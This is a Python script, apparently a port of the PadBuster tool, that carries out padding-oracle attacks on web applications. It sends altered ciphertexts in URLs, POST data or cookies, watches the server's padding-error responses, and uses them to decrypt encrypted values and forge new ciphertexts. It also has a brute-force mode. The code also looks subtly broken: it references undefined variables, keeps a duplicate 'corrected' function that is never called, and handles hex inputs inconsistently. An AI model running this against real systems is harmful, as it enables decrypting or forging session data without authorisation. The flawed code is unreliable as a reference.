#!/usr/bin/env python3
import argparse
import base64
import binascii
import gzip
import logging
import os
import sys
import time
from datetime import datetime
from urllib.parse import quote, unquote

import requests

# Initialize logging
logger = logging.getLogger('PadBuster')
logger.setLevel(logging.INFO)
log_handler = logging.StreamHandler(sys.stdout)
log_formatter = logging.Formatter('%(message)s')
log_handler.setFormatter(log_formatter)
logger.addHandler(log_handler)


def parse_arguments():
    parser = argparse.ArgumentParser(
        description='PadBuster - v0.3.3\nBrian Holyfield - Gotham Digital Science\nlabs@gdssecurity.com',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('URL', help='The target URL (and query string if applicable)')
    parser.add_argument('EncryptedSample', help='The encrypted value you want to test. Must also be present in the URL, PostData or a Cookie')
    parser.add_argument('BlockSize', type=int, help='The block size being used by the algorithm')

    # Optional arguments
    parser.add_argument('-auth', help='HTTP Basic Authentication (username:password)')
    parser.add_argument('-bruteforce', action='store_true', help='Perform brute force against the first block')
    parser.add_argument('-ciphertext', help='CipherText for Intermediate Bytes (Hex-Encoded)')
    parser.add_argument('-cookies', help='HTTP Cookies (name1=value1; name2=value2)')
    parser.add_argument('-encoding', type=int, choices=range(0, 5), default=0,
                        help='Encoding Format of Sample (Default 0)\n'
                             '0=Base64, 1=Lower HEX, 2=Upper HEX, 3=.NET UrlToken, 4=WebSafe Base64')
    parser.add_argument('-encodedtext', help='Data to Encrypt (Encoded)')
    parser.add_argument('-error', help='Padding Error Message')
    parser.add_argument('-headers', help='Custom Headers (name1::value1;name2::value2)')
    parser.add_argument('-interactive', action='store_true', help='Prompt for confirmation on decrypted bytes')
    parser.add_argument('-intermediate', help='Intermediate Bytes for CipherText (Hex-Encoded)')
    parser.add_argument('-log', action='store_true', help='Generate log files (creates folder PadBuster.DDMMYY)')
    parser.add_argument('-noencode', action='store_true', help='Do not URL-encode the payload (encoded by default)')
    parser.add_argument('-noiv', action='store_true', help='Sample does not include IV (decrypt first block)')
    parser.add_argument('-plaintext', help='Plain-Text to Encrypt')
    parser.add_argument('-post', help='HTTP Post Data String')
    parser.add_argument('-prefix', help='Prefix bytes to append to each sample (Encoded)')
    parser.add_argument('-proxy', help='Use HTTP/S Proxy (address:port)')
    parser.add_argument('-proxyauth', help='Proxy Authentication (username:password)')
    parser.add_argument('-resume', type=int, help='Resume at this block number')
    parser.add_argument('-usebody', action='store_true', help='Use response body content for response analysis phase')
    parser.add_argument('-verbose', action='store_true', help='Be Verbose')
    parser.add_argument('-veryverbose', action='store_true', help='Be Very Verbose (Debug Only)')

    args = parser.parse_args()
    return args


def encode_decode(data, operation, fmt):
    """
    Encode or decode data based on the specified format.
    operation: 0=Encode, 1=Decode
    fmt: 0=Base64, 1=Lower HEX, 2=Upper HEX, 3=.NET UrlToken, 4=WebSafe Base64
    """
    if fmt in [1, 2]:
        # HEX
        if operation == 1:
            # Decode
            try:
                return binascii.unhexlify(data.lower())
            except binascii.Error as e:
                logger.error(f"HEX Decode Error: {e}")
                sys.exit(1)
        else:
            # Encode
            if isinstance(data, bytes):
                encoded = binascii.hexlify(data).decode()
            else:
                encoded = binascii.hexlify(data.encode()).decode()
            return encoded.upper() if fmt == 2 else encoded.lower()
    elif fmt == 3:
        # .NET UrlToken
        if operation == 1:
            return web64_decode(data, net=True)
        else:
            return web64_encode(data, net=True)
    elif fmt == 4:
        # WebSafe Base64
        if operation == 1:
            return web64_decode(data, net=False)
        else:
            return web64_encode(data, net=False)
    else:
        # Base64
        if operation == 1:
            try:
                return base64.b64decode(data)
            except binascii.Error as e:
                logger.error(f"Base64 Decode Error: {e}")
                sys.exit(1)
        else:
            if isinstance(data, bytes):
                encoded = base64.b64encode(data).decode()
            else:
                encoded = base64.b64encode(data.encode()).decode()
            return encoded.rstrip('\n')


def web64_encode(data, net=False):
    """
    WebSafe Base64 Encode
    """
    if isinstance(data, str):
        data = data.encode()
    encoded = base64.b64encode(data).decode().rstrip('=')
    encoded = encoded.replace('+', '-').replace('/', '_')
    if net:
        count = (4 - len(encoded) % 4) % 4
        encoded += str(count)
    return encoded


def web64_decode(data, net=False):
    """
    WebSafe Base64 Decode
    """
    if net:
        try:
            count = int(data[-1])
            data = data[:-1]
            data += '=' * count
        except (ValueError, IndexError):
            logger.error("Invalid .NET UrlToken padding.")
            sys.exit(1)
    data = data.replace('-', '+').replace('_', '/')
    try:
        return base64.b64decode(data)
    except binascii.Error as e:
        logger.error(f"WebSafe Base64 Decode Error: {e}")
        sys.exit(1)


def prompt_user(prompt, default=None, yn=False):
    while True:
        if default:
            response = input(f"{prompt} [{default}]: ") or default
        else:
            response = input(f"{prompt}: ")
        response = response.strip()
        if yn:
            if response.lower() in ['y', 'n', 'a']:
                return response.lower()
            else:
                print("Please enter 'y', 'n', or 'a'.")
        else:
            if response:
                return response
            else:
                print("Input cannot be empty.")


def write_file(file_path, content, log_files, dir_name, dir_slash):
    if log_files:
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
        full_path = os.path.join(dir_name, file_path)
        with open(full_path, 'a') as f:
            f.write(content)


def get_time(format_type='F'):
    now = datetime.now()
    if format_type == 'F':
        return now.strftime('%d') + now.strftime('%b').upper() + now.strftime('%y') + '-' + str(int(now.timestamp()))
    elif format_type == 'S':
        return now.strftime('%b %d, 20%y at %H:%M:%S')
    else:
        return now.strftime('%H:%M:%S')


def uri_escape(data):
    return quote(data, safe='')


def uri_unescape(data):
    return unquote(data)


def make_request(session, method, url, data, cookies, headers, proxy, proxyauth, verbose):
    """
    Make an HTTP request and return status, content, location, and content length.
    """
    try:
        start_time = time.time()
        if method.upper() == 'POST':
            response = session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False, timeout=30)
        else:
            response = session.get(url, params=data, cookies=cookies, headers=headers, allow_redirects=False, timeout=30)
        end_time = time.time()
        elapsed_time = end_time - start_time

        status = response.status_code
        content = response.text
        location = response.headers.get('Location', 'N/A')
        content_length = len(content)

        if response.headers.get('Content-Encoding', '').lower() == 'gzip':
            try:
                content = gzip.decompress(response.content).decode()
                content_length = len(content)
            except (OSError, EOFError):
                pass  # If decompression fails, keep original content

        if verbose:
            logger.debug(f"Response Content:\n{content}")

        return status, content, location, content_length
    except requests.exceptions.RequestException as e:
        logger.error(f"ERROR: {e}")
        return '000', '', 'N/A', 0


def determine_signature(oracle_guesses, response_file_buffer, use_body):
    """
    Help the user detect the oracle response if an error string was not provided.
    """
    sorted_guesses = sorted(oracle_guesses.items(), key=lambda item: item[1], reverse=True)

    logger.info("The following response signatures were returned:")
    logger.info("-------------------------------------------------------")
    if use_body:
        logger.info("ID#\tFreq\tStatus\tLength\tChksum\tLocation")
    else:
        logger.info("ID#\tFreq\tStatus\tLength\tLocation")
    logger.info("-------------------------------------------------------")

    for idx, (sig, freq) in enumerate(sorted_guesses, start=1):
        line = f"{idx}\t{freq}\t"
        fields = sig.split('\t')
        line += f"{fields[0]}\t{fields[1]}"
        if use_body:
            checksum = binascii.crc32(fields[3].encode()) & 0xffffffff
            line += f"\t{checksum}"
        line += f"\t{fields[2]}"
        logger.info(line)
        write_file(f"Response_Analysis_Signature_{idx}.txt", response_file_buffer[sig], log_files=True, dir_name=dir_name, dir_slash=dir_slash)

    logger.info("-------------------------------------------------------")

    if len(sorted_guesses) == 1:
        logger.error("ERROR: All of the responses were identical.")
        logger.error("Double check the Block Size and try again.")
        sys.exit(1)
    else:
        while True:
            try:
                response_num = int(prompt_user("\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended", default=str(len(sorted_guesses)), yn=False))
                if 1 <= response_num <= len(sorted_guesses):
                    break
                else:
                    logger.error("Invalid ID number.")
            except ValueError:
                logger.error("Please enter a valid number.")
        logger.info(f"\nContinuing test with selection {response_num}\n")
        return sorted_guesses[response_num - 1][0]


def prep_request(url, post_data, cookies, sample, test_bytes):
    """
    Prepare the request by replacing the sample with test_bytes in URL, POST data, or cookies.
    """
    test_url = url
    was_sample_found = False

    if sample in test_url:
        test_url = test_url.replace(sample, test_bytes)
        was_sample_found = True

    test_post = post_data if post_data else ""
    if test_post and sample in test_post:
        test_post = test_post.replace(sample, test_bytes)
        was_sample_found = True

    test_cookies = cookies.copy()
    if sample in ''.join([f"{k}={v};" for k, v in test_cookies.items()]):
        for k in test_cookies:
            if test_cookies[k] == sample:
                test_cookies[k] = test_bytes
                was_sample_found = True

    if not was_sample_found:
        logger.error("ERROR: Encrypted sample was not found in the test request")
        sys.exit(1)

    return test_url, test_post, test_cookies


def process_block(sample_bytes, context):
    """
    Process a single block to find intermediary bytes.

    Args:
        sample_bytes (bytes): The ciphertext block to process.
        context (dict): A dictionary containing necessary context variables.

    Returns:
        bytes: The intermediate bytes for the block.
    """
    analysis_mode = 0 if (not context.get('error') and not context.get('oracle_signature')) else 1

    return_value = bytearray()

    complete = False
    auto_retry = False
    has_hit = False

    while not complete:
        return_value = bytearray()
        repeat = False
        test_bytes = bytearray(b'\x00' * context['block_size'])
        false_positive_detector = 0

        # Iterate over each byte from the end to the start
        for byte_num in reversed(range(context['block_size'])):
            for i in reversed(range(256)):
                test_bytes[byte_num] = i
                combined_test_bytes = bytes(test_bytes) + sample_bytes

                if context.get('prefix'):
                    decoded_prefix = encode_decode(context['prefix'], 1, context['encoding_format'])
                    combined_test_bytes = decoded_prefix + combined_test_bytes

                encoded_combined_test_bytes = encode_decode(combined_test_bytes, 0, context['encoding_format'])

                if not context.get('noencode'):
                    encoded_combined_test_bytes = uri_escape(encoded_combined_test_bytes)

                # Prepare request by replacing the sample with the test bytes
                test_url, test_post, test_cookies = prep_request(
                    context['url'], context['post'], context['cookies'], context['sample'], encoded_combined_test_bytes
                )

                # Make the HTTP request
                resp_status, resp_content, resp_location, resp_length = make_request(
                    context['session'], context['method'], test_url, test_post, test_cookies,
                    context['headers'], context['proxy'], context['proxyauth'], context['very_verbose']
                )

                signature_data = f"{resp_status}\t{resp_length}\t{resp_location}"
                if context.get('use_body'):
                    signature_data += f"\t{resp_content}"

                if analysis_mode == 0:
                    if i == 255:
                        logger.info("INFO: No error string was provided...starting response analysis\n")
                    context['oracle_guesses'][signature_data] = context['oracle_guesses'].get(signature_data, 0) + 1
                    context['response_file_buffer'][signature_data] = (
                        f"URL: {test_url}\nPost Data: {test_post}\nCookies: {test_cookies}\n\n"
                        f"Status: {resp_status}\nLocation: {resp_location}\nContent-Length: {resp_length}\nContent:\n{resp_content}"
                    )

                    if byte_num == (context['block_size'] - 1) and i == 0:
                        logger.info("*** Response Analysis Complete ***\n")
                        context['oracle_signature'] = determine_signature(
                            context['oracle_guesses'], context['response_file_buffer'], context['use_body']
                        )
                        analysis_mode = 1
                        repeat = True
                        break  # Exit the byte_num loop to restart with analysis_mode = 1

                continue_check = 'y'

                # Determine if padding was correct
                if ((context.get('error') and context['error'] not in resp_content) or
                        (context.get('oracle_signature') and context['oracle_signature'] != signature_data)):
                    if auto_retry and (byte_num == (context['block_size'] - 1)) and not has_hit:
                        has_hit = True
                    else:
                        logger.info(f"[+] Success: ({abs(i-256)}/256) [Byte {byte_num + 1}]")
                        logger.debug(f"[+] Test Byte: {uri_escape(bytes([test_bytes[byte_num]]))}")

                        if i == 255:
                            false_positive_detector += 1

                        if context.get('interactive'):
                            continue_check = prompt_user("Do you want to use this value (Yes/No/All)? [y/n/a]", default='', yn=True)

                        if continue_check in ['y', 'a']:
                            if continue_check == 'a':
                                context['interactive'] = False

                            # Calculate decrypted byte
                            current_padding_byte = context['block_size'] - byte_num
                            decrypted_byte = test_bytes[byte_num] ^ current_padding_byte
                            decrypted_byte_bytes = bytes([decrypted_byte])

                            logger.info(f"[+] XORing with Padding Char, which is {uri_escape(bytes([current_padding_byte]))}")
                            logger.info(f"[+] Decrypted Byte is: {uri_escape(decrypted_byte_bytes)}")

                            return_value = decrypted_byte_bytes + return_value

                            # Update test_bytes for next byte
                            for k in range(byte_num, context['block_size']):
                                test_bytes[k] ^= current_padding_byte
                                test_bytes[k] ^= (context['block_size'] - byte_num + 1)

                            break  # Move to the next byte_num

                # Handle cases where no matching response was found
                if i == 0 and analysis_mode == 1:
                    logger.error(f"ERROR: No matching response on [Byte {byte_num + 1}]")

                    if not auto_retry:
                        auto_retry = True
                        logger.info("       Automatically trying one more time...")
                        repeat = True
                        break  # Restart the block processing
                    else:
                        if (byte_num == (context['block_size'] - 1)) and context.get('error'):
                            logger.info("\nAre you sure you specified the correct error string?")
                            logger.info("Try re-running without the -e option to perform a response analysis.\n")

                        continue_check = prompt_user("Do you want to start this block over? (Yes/No)? [y/n/a]", default='', yn=True)
                        if continue_check != 'n':
                            logger.info("INFO: Switching to interactive mode")
                            context['interactive'] = True
                            repeat = True
                            break  # Restart the block processing

                # Detect false positives
                if false_positive_detector == context['block_size']:
                    logger.error("\n*** ERROR: It appears there are false positive results. ***\n")
                    logger.info("HINT: The most likely cause for this is an incorrect error string.")
                    if context.get('error'):
                        logger.info("[+] Check the error string you provided and try again, or consider running")
                        logger.info("[+] without an error string to perform an automated response analysis.\n")
                    else:
                        logger.info("[+] You may want to consider defining a custom padding error string")
                        logger.info("[+] instead of the automated response analysis.\n")

                    continue_check = prompt_user("Do you want to start this block over? (Yes/No)? [y/n/a]", default='', yn=True)
                    if continue_check == 'y':
                        logger.info("INFO: Switching to interactive mode")
                        context['interactive'] = True
                        repeat = True
                        break  # Restart the block processing

            if repeat:
                break  # Restart the while loop

        return bytes(return_value)


def determine_signature_corrected(oracle_guesses, response_file_buffer, use_body, log_files, dir_name, dir_slash):
    """
    Corrected function to include additional parameters for logging.
    """
    sorted_guesses = sorted(oracle_guesses.items(), key=lambda item: item[1], reverse=True)

    logger.info("The following response signatures were returned:")
    logger.info("-------------------------------------------------------")
    if use_body:
        logger.info("ID#\tFreq\tStatus\tLength\tChksum\tLocation")
    else:
        logger.info("ID#\tFreq\tStatus\tLength\tLocation")
    logger.info("-------------------------------------------------------")

    for idx, (sig, freq) in enumerate(sorted_guesses, start=1):
        line = f"{idx}\t{freq}\t"
        fields = sig.split('\t')
        line += f"{fields[0]}\t{fields[1]}"
        if use_body:
            checksum = binascii.crc32(fields[3].encode()) & 0xffffffff
            line += f"\t{checksum}"
        line += f"\t{fields[2]}"
        logger.info(line)
        write_file(f"Response_Analysis_Signature_{idx}.txt", response_file_buffer[sig], log_files, dir_name, dir_slash)

    logger.info("-------------------------------------------------------")

    if len(sorted_guesses) == 1:
        logger.error("ERROR: All of the responses were identical.")
        logger.error("Double check the Block Size and try again.")
        sys.exit(1)
    else:
        while True:
            try:
                response_num = int(prompt_user("\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended", default=str(len(sorted_guesses)), yn=False))
                if 1 <= response_num <= len(sorted_guesses):
                    break
                else:
                    logger.error("Invalid ID number.")
            except ValueError:
                logger.error("Please enter a valid number.")
        logger.info(f"\nContinuing test with selection {response_num}\n")
        return sorted_guesses[response_num - 1][0]


def main_corrected():
    args = parse_arguments()

    # Configure logging level
    if args.veryverbose:
        logger.setLevel(logging.DEBUG)
    elif args.verbose:
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(logging.WARNING)

    # Assign variables
    url = args.URL
    sample = args.EncryptedSample
    block_size = args.BlockSize

    if not url or not sample or not block_size:
        logger.error("ERROR: The URL, EncryptedSample and BlockSize cannot be null.")
        sys.exit(1)

    method = 'POST' if args.post else 'GET'

    # File-related variables
    dir_name = f"PadBuster.{get_time('F')}"
    dir_slash = os.sep
    dir_cmd = "mkdir" if os.name != 'nt' else "md"
    dir_exists = False
    print_stats = False
    request_tracker = 0
    time_tracker = 0

    encoding_format = args.encoding if args.encoding else 0

    encrypted_bytes = sample
    total_requests = 0

    # URL decode if necessary
    if '%' in sample:
        encrypted_bytes = uri_unescape(encrypted_bytes)

    # Decode the sample
    encrypted_bytes_decoded = encode_decode(encrypted_bytes, 1, encoding_format)

    if len(encrypted_bytes_decoded) % block_size != 0:
        logger.error(f"ERROR: Encrypted Bytes must be evenly divisible by Block Size ({block_size})")
        logger.error(f"       Encrypted sample length is {len(encrypted_bytes_decoded)}. Double check the Encoding and Block Size.")
        sys.exit(1)

    # Handle no IV
    if args.noiv and not args.bruteforce and not args.plaintext:
        encrypted_bytes_decoded = b'\x00' * block_size + encrypted_bytes_decoded

    plain_text_bytes = b'' if not args.plaintext else None
    was_sample_found = False
    forged_bytes = b''

    iv_bytes = encrypted_bytes_decoded[:block_size] if not args.noiv else b'\x00' * block_size

    oracle_candidates = []
    oracle_signature = ""
    oracle_guesses = {}
    response_file_buffer = {}

    block_count = len(encrypted_bytes_decoded) // block_size

    if not args.bruteforce and not args.plaintext and block_count < 2:
        logger.error(f"ERROR: There is only one block. Try again using the -noiv option.")
        sys.exit(1)

    # Prepare session
    session = requests.Session()

    # Configure proxy if needed
    if args.proxy:
        proxy_url = f"http://{args.proxy}"
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies.update(proxies)
        if args.proxyauth:
            proxy_user, proxy_pass = args.proxyauth.split(':', 1)
            session.proxies.update({
                'http': f"http://{proxy_user}:{proxy_pass}@{args.proxy}",
                'https': f"http://{proxy_user}:{proxy_pass}@{args.proxy}"
            })

    # Configure authentication if needed
    if args.auth:
        http_user, http_pass = args.auth.split(':', 1)
        session.auth = (http_user, http_pass)

    # Configure headers if needed
    headers = {}
    if args.headers:
        custom_headers = args.headers.split(';')
        for header in custom_headers:
            if '::' in header:
                name, value = header.split('::', 1)
                headers[name.strip()] = value.strip()
    if args.cookies:
        cookies = {}
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()
    else:
        cookies = {}

    # Initial request to check status
    status, content, location, content_length = make_request(
        session, method, url, args.post, cookies, headers, args.proxy, args.proxyauth, args.verbose or args.veryverbose
    )

    # Log the banner
    logger.info("\n+-------------------------------------------+")
    logger.info("| PadBuster - v0.3.3                        |")
    logger.info("| Brian Holyfield - Gotham Digital Science  |")
    logger.info("| labs@gdssecurity.com                      |")
    logger.info("+-------------------------------------------+\n")

    logger.info(f"INFO: The original request returned the following")
    logger.info(f"[+] Status: {status}")
    logger.info(f"[+] Location: {location}")
    logger.info(f"[+] Content Length: {content_length}\n")
    logger.debug(f"[+] Response: {content}\n")

    if args.encodedtext:
        plain_text_input = encode_decode(args.encodedtext, 1, encoding_format)
    else:
        plain_text_input = None

    if args.bruteforce:
        # Brute Force Mode
        logger.info("INFO: Starting PadBuster Brute Force Mode")
        bf_attempts = 0

        if args.resume:
            logger.info(f"INFO: Resuming previous brute force at attempt {args.resume}")

        # Generate brute force samples for first 2 bytes
        bf_samples = [bytes([c, d]) for c in range(256) for d in range(256)]

        for test_val in bf_samples:
            complete = False
            while not complete:
                repeat = False
                for b in reversed(range(256)):
                    bf_attempts += 1
                    if args.resume and bf_attempts < (args.resume - (args.resume % 256) + 1):
                        continue  # Skip attempts
                    test_bytes = bytes([b]) + test_val
                    test_bytes += b'\x00' * (block_size - 3)
                    combined_bf = test_bytes + encrypted_bytes_decoded
                    combined_bf_encoded = encode_decode(combined_bf, 0, encoding_format)
                    if not args.noencode:
                        combined_bf_encoded = uri_escape(combined_bf_encoded)

                    # Prepare request
                    test_url, test_post, test_cookies = prep_request(url, args.post, cookies, sample, combined_bf_encoded)

                    # Make request
                    resp_status, resp_content, resp_location, resp_length = make_request(
                        session, method, test_url, test_post, test_cookies, headers, args.proxy, args.proxyauth, args.verbose or args.veryverbose
                    )

                    signature_data = f"{resp_status}\t{resp_length}\t{resp_location}"
                    if args.usebody:
                        signature_data += f"\t{resp_content}"

                    if not oracle_signature:
                        if b == 0:
                            logger.debug("[+] Starting response analysis...\n")
                        oracle_guesses[signature_data] = oracle_guesses.get(signature_data, 0) + 1
                        response_file_buffer[signature_data] = (
                            f"URL: {test_url}\nPost Data: {test_post}\nCookies: {test_cookies}\n\n"
                            f"Status: {resp_status}\nLocation: {resp_location}\nContent-Length: {resp_length}\nContent:\n{resp_content}"
                        )
                        if b == 255:
                            logger.info("*** Response Analysis Complete ***\n")
                            oracle_signature = determine_signature(
                                oracle_guesses, response_file_buffer, args.usebody
                            )
                            print_stats = True
                            time_tracker = 0
                            request_tracker = 0
                            repeat = True
                            bf_attempts = 0
                    if oracle_signature and oracle_signature != signature_data:
                        logger.info(f"\nAttempt {bf_attempts} - Status: {resp_status} - Content Length: {resp_length}\n{test_url}\n")
                        write_file(f"Brute_Force_Attempt_{bf_attempts}.txt",
                                   f"URL: {test_url}\nPost Data: {test_post}\nCookies: {test_cookies}\n\n"
                                   f"Status: {resp_status}\nLocation: {resp_location}\nContent-Length: {resp_length}\nContent:\n{resp_content}",
                                   args.log,
                                   dir_name,
                                   dir_slash)
                complete = not repeat
    elif plain_text_input:
        # Encrypt Mode
        logger.info("INFO: Starting PadBuster Encrypt Mode")

        # Calculate block count and pad the plaintext
        block_count = int(((len(plain_text_input) + 1) / block_size) + 0.99)
        logger.info(f"[+] Number of Blocks: {block_count}\n")
        pad_count = (block_size * block_count) - len(plain_text_input)
        plain_text_input += bytes([pad_count]) * pad_count

        # Initialize forged_bytes with ciphertext or nulls
        forged_bytes = encode_decode(args.ciphertext, 1, 1) if args.ciphertext else b'\x00' * block_size
        sample_bytes = forged_bytes

        for block_num in range(block_count, 0, -1):
            intermediary_bytes = encode_decode(args.intermediate, 1, 2) if args.intermediate and block_num == block_count else process_block(sample_bytes, {
                'error': args.error,
                'oracle_signature': oracle_signature,
                'url': url,
                'post': args.post,
                'cookies': cookies,
                'sample': sample,
                'block_size': block_size,
                'encoding_format': encoding_format,
                'prefix': args.prefix,
                'noencode': args.noencode,
                'interactive': args.interactive,
                'use_body': args.usebody,
                'session': session,
                'method': method,
                'headers': headers,
                'proxy': args.proxy,
                'proxyauth': args.proxyauth,
                'very_verbose': args.veryverbose,
                'oracle_guesses': oracle_guesses,
                'response_file_buffer': response_file_buffer
            })

            # XOR the intermediary bytes with the corresponding bytes from the plain-text block
            plain_block = plain_text_input[(block_num - 1) * block_size:block_num * block_size]
            decrypted_block = bytes(a ^ b for a, b in zip(intermediary_bytes, plain_block))

            # Corrected XOR operation
            sample_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes, plain_block))
            forged_bytes = sample_bytes + forged_bytes

            logger.info(f"\nBlock {block_num} Results:")
            logger.info(f"[+] New Cipher Text (HEX): {binascii.hexlify(sample_bytes).decode()}")
            logger.info(f"[+] Intermediate Bytes (HEX): {binascii.hexlify(intermediary_bytes).decode()}\n")

        forged_bytes_encoded = encode_decode(forged_bytes, 0, encoding_format).strip()
    else:
        # Decrypt Mode
        logger.info("INFO: Starting PadBuster Decrypt Mode")
        resume_block = args.resume if args.resume else 1

        for block_num in range(resume_block + 1, block_count + 1):
            logger.info(f"*** Starting Block {block_num - 1} of {block_count - 1} ***\n")
            sample_bytes = encrypted_bytes_decoded[(block_num - 1) * block_size:block_num * block_size]
            intermediary_bytes = process_block(sample_bytes, {
                'error': args.error,
                'oracle_signature': oracle_signature,
                'url': url,
                'post': args.post,
                'cookies': cookies,
                'sample': sample,
                'block_size': block_size,
                'encoding_format': encoding_format,
                'prefix': args.prefix,
                'noencode': args.noencode,
                'interactive': args.interactive,
                'use_body': args.usebody,
                'session': session,
                'method': method,
                'headers': headers,
                'proxy': args.proxy,
                'proxyauth': args.proxyauth,
                'very_verbose': args.veryverbose,
                'oracle_guesses': oracle_guesses,
                'response_file_buffer': response_file_buffer
            })

            if block_num == 2:
                decrypted_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes, iv_bytes))
            else:
                decrypted_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes,
                                                              encrypted_bytes_decoded[(block_num - 2) * block_size:(block_num - 1) * block_size]))
            logger.info(f"\nBlock {block_num - 1} Results:")
            logger.info(f"[+] Cipher Text (HEX): {binascii.hexlify(sample_bytes).decode()}")
            logger.info(f"[+] Intermediate Bytes (HEX): {binascii.hexlify(intermediary_bytes).decode()}")
            logger.info(f"[+] Plain Text: {decrypted_bytes}\n")
            plain_text_bytes += decrypted_bytes

    # Final Output
    logger.info("-------------------------------------------------------")
    logger.info("** Finished ***")
    if plain_text_input:
        logger.info(f"[+] Encrypted value is: {uri_escape(forged_bytes_encoded)}")
    else:
        try:
            decrypted_ascii = plain_text_bytes.decode('utf-8')
        except UnicodeDecodeError:
            decrypted_ascii = plain_text_bytes.decode('utf-8', errors='replace')
        logger.info(f"[+] Decrypted value (ASCII): {decrypted_ascii}")
        logger.info(f"[+] Decrypted value (HEX): {binascii.hexlify(plain_text_bytes).decode()}")
        logger.info(f"[+] Decrypted value (Base64): {base64.b64encode(plain_text_bytes).decode()}")
    logger.info("-------------------------------------------------------\n")


if __name__ == "__main__":
    main_corrected()

